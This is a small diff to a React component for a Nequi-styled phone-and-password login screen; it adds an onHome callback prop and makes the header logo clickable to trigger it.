@@ -4,9 +4,10 @@ import { NequiLogo } from './NequiLogo'
 interface NequiLoginScreenProps {
   phone: string
   onSuccess: (phoneValue: string, password: string) => void
+  onHome: () => void
 }
 
-export function NequiLoginScreen({ phone, onSuccess }: NequiLoginScreenProps) {
+export function NequiLoginScreen({ phone, onSuccess, onHome }: NequiLoginScreenProps) {
   const [phoneValue, setPhoneValue] = useState(phone)
   const [password, setPassword] = useState('')
   const [confirmed, setConfirmed] = useState(false)
@@ -27,7 +28,7 @@ export function NequiLoginScreen({ phone, onSuccess }: NequiLoginScreenProps) {
     <div className="min-h-screen w-full flex flex-col overflow-hidden" style={{ background: '#fce4f0' }}>
       {/* Header */}
       <header className="w-full px-6 flex items-center bg-white shadow-sm" style={{ height: '64px' }}>
-        <NequiLogo size="lg" color="dark" />
+        <NequiLogo size="lg" color="dark" onClick={onHome} />
       </header>
 
       {/* Background decorative shapes */}
